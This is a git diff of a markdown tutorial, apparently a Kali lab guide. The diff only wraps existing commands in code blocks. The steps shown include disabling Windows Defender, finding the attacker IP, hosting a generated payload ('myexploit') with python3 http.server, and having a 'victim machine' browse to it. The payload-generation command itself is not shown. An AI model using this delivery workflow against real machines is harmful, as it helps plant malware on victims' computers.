@@ -26,8 +26,10 @@ Disable Windows Defender:
 
 Get your Kali IP atfirst:
 
-**Command** - ip a
-
+**Command** - 
+```
+ip a
+```
 
 **Command**: 
 ```
@@ -40,7 +42,9 @@ Here the payload generation is successful and saved as our given name myexploit.
 
 ### Step 3: Host Payload for Delivery
 **Command**: 
+```
 python3 -m http.server -b <your_machine_ip> <port_number>
+```
 ### N.B (Use port 8000 (or any port except 4554)
 **Example**- After that open browser from the victim machine and use the url you just started as server  http://192.168.0.7:8999 
 ### example - python3 -m http.server -b 192.168.56.102 4444 
